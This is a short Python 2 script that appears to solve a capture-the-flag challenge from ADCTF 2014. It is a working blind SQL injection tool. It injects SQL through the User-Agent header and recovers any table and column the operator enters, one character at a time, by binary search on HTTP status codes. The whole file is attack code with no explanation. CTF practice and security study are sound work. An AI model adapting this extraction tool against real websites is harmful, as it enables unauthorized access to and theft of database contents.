import urllib2
from time import sleep

URI = 'http://secrettable.adctf2014.katsudon.org/'

def communicate(code):
    req = urllib2.Request(URI, None, {'User-agent':"'+(%s)+'" % code})
    try:
        res = urllib2.urlopen(req)
        http_code = 200
    except urllib2.HTTPError, e:
        http_code = e.code  
  
    return http_code==200

def decideValue(sql):
    lo, hi = 0x1f, 0x7f
    while lo < hi:
        mid = (lo + hi) / 2
        query = "case when (%s) > '%c' then 1 end" % (sql,mid)
        if communicate(query):
            lo = mid + 1
        else:
            hi = mid

    return hi

def SQLinjection(items):
    DATA=''
    for i in range(1,0x500):
        sql = "select substr(col,%d,1) from (select %s as col from %s %s %s) sub" % (i,items['column'].replace(',','||'),items['table'],('where '+items['where'] if 'where' in items and items['where']!='' else ''),(items['others'] if 'others' in items and items['others']!=''  else ''))
        if communicate("case when (%s) > '' then 1 end" % sql):
            DATA += chr(decideValue(sql))
        else:
            break
        print DATA
    return DATA

def dump(TABLE_NAME,COLUMN_NAME,WHERE,OTHERS):
    items = {'column':COLUMN_NAME,'table':TABLE_NAME,'where':WHERE,'others':OTHERS}
    return SQLinjection(items)


if __name__ == '__main__':
    table = raw_input('Table >>')
    column = raw_input('Column >>')
    where = raw_input('Where >>')
    others = raw_input('Others >>')
    
    print 'Result:'+dump(table,column,where,others)
    raw_input('Press any key to exit...')
